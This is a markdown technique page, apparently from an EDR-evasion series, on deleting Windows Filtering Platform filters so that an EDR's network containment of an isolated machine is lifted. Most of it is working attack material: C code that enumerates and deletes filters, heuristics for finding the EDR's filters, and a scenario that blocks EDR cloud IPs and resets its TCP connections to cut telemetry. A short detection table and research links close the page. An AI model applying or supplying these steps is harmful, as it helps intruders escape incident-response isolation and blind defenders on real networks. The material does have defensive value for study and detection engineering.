# Technique 03 — WFP Filter Deletion (Lift Network Containment)

## Overview

The inverse of filter injection: instead of **adding** block filters, this technique
**deletes existing** EDR-installed filters. Used when an EDR has put a machine under
"network containment" (isolated from the network during an active incident) — the
attacker removes those block filters to restore network access.

---

## Background: EDR Network Containment

When an EDR detects a serious threat, it can remotely issue a "containment" command
that instructs its agent to add high-weight BLOCK filters in WFP, preventing all
outbound traffic except to the EDR's own C2.

Example containment state (simplified):
```
Layer: FWPM_LAYER_ALE_AUTH_CONNECT_V4
  Filter [weight=0xFF, action=BLOCK, condition=any]         ← blocks everything
  Filter [weight=0x01, action=PERMIT, condition=IP=10.0.0.1] ← allows EDR C2 only
```

The goal: delete the BLOCK filter to regain network access while the machine is
supposedly isolated.

---

## Attack Method

### Step 1: Enumerate All Filters

```c
HANDLE engineHandle;
FwpmEngineOpen0(NULL, RPC_C_AUTHN_WINNT, NULL, NULL, &engineHandle);

// Create an enumeration template to list all filters
HANDLE enumHandle;
FwpmFilterCreateEnumHandle0(engineHandle, NULL, &enumHandle);

FWPM_FILTER0 **filters;
UINT32 numFilters;
FwpmFilterEnum0(engineHandle, enumHandle, 1000, &filters, &numFilters);

for (UINT32 i = 0; i < numFilters; i++) {
    FWPM_FILTER0 *f = filters[i];
    // Examine f->displayData.name, f->action.type, f->layerKey, etc.
    wprintf(L"Filter: %s | Action: %d\n", f->displayData.name, f->action.type);
}
```

### Step 2: Identify EDR Filters

Heuristics for identifying EDR-owned containment filters:
- `action.type == FWP_ACTION_BLOCK`
- `layerKey == FWPM_LAYER_ALE_AUTH_CONNECT_V4` or similar
- `providerKey` matches a known EDR vendor GUID
- `displayData.name` contains keywords like "Isolat", "Contain", "Block", etc.
- Conditions: no specific condition (catches all traffic)

The SCRT research found that some EDRs leave their C2 permit rule with:
- Low weight
- No `FWPM_FILTER_FLAG_CLEAR_ACTION_RIGHT`

This makes the permit rule soft — adding a higher-weight BLOCK in a different sublayer
with `CLEAR_ACTION_RIGHT` can override it, effectively cutting off even the EDR C2.

### Step 3: Delete the Block Filter

```c
// Delete by filter GUID (key)
GUID filterKey = filters[i]->filterKey;
HRESULT hr = FwpmFilterDeleteByKey0(engineHandle, &filterKey);

// Or delete by numeric filter ID
UINT64 filterId = filters[i]->filterId;
hr = FwpmFilterDeleteById0(engineHandle, filterId);

if (SUCCEEDED(hr)) {
    wprintf(L"[+] Filter deleted successfully\n");
}
```

### Step 4: Advanced — Block EDR Telemetry While Lifting Containment

Described in the WFP Wizardry research (three-scenario approach):

```
Scenario 3: Selective Re-containment
  1. Temporarily block ALL outbound traffic
  2. Delete EDR's own PERMIT filter (cutting EDR C2)
  3. Resolve EDR cloud domain IPs via getaddrinfo()
  4. Add persistent BLOCK filters for those resolved IPs
  5. Remove the temporary all-block filter
  6. Loop: call SetTcpEntry() to reset active TCP connections to EDR
     (forces EDR to reconnect — but new connections hit the block filter)
```

`SetTcpEntry()` is in `iphlpapi.dll` and allows resetting TCP connection state:
```c
MIB_TCPROW row;
row.dwState = MIB_TCP_STATE_DELETE_TCB;
// fill in local/remote port and IP
SetTcpEntry(&row);
```

---

## Limitations

### Callout-Protected EDR Filters

Some hardened EDRs register their block filters via a **kernel callout**, not a simple
filter. Callout registrations cannot be deleted from user-mode:

```c
FwpmFilterDeleteByKey0(engineHandle, &calloutFilterKey);
// Returns: ERROR_ACCESS_DENIED or FWP_E_CALLOUT_NOTIFICATION_FAILED
```

To remove callout-backed filters, you need:
- Kernel code execution (custom driver)
- BYOVD to disable the callout registration

### Security Descriptor on BFE

The Base Filtering Engine service has a security descriptor. Some EDRs modify it to
prevent non-EDR processes from calling `FwpmEngineOpen0` with write access:

```
SDDL: D:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)
      (A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)
```

If the EDR restricts BFE access, `FwpmFilterDeleteByKey0` fails with `E_ACCESSDENIED`.

---

## Detection

| Artifact | Details |
|---|---|
| Event 5447 (Delete) | Logged for every filter deletion |
| Gap in containment timeline | SIEM correlation: containment→filter delete→outbound traffic |
| BFE audit logs | Non-EDR process calling `FwpmEngineOpen0` |

---

## Key Research Reference

- SCRT Blog: *Blinding EDRs: A deep dive into WFP manipulation* (2025)  
  `https://blog.scrt.ch/2025/08/25/blinding-edrs-a-deep-dive-into-wfp-manipulation/`

- WFP Wizardry: *Abusing WFP for EDR Evasion* (2025)  
  `https://jacobkalat.com/edr-evasion/2025/02/12/WFP-Wizardry-Abusing-WFP-for-EDR-Evasion.html`

---

Next: `04_byovd-360wfp-exploit.md`
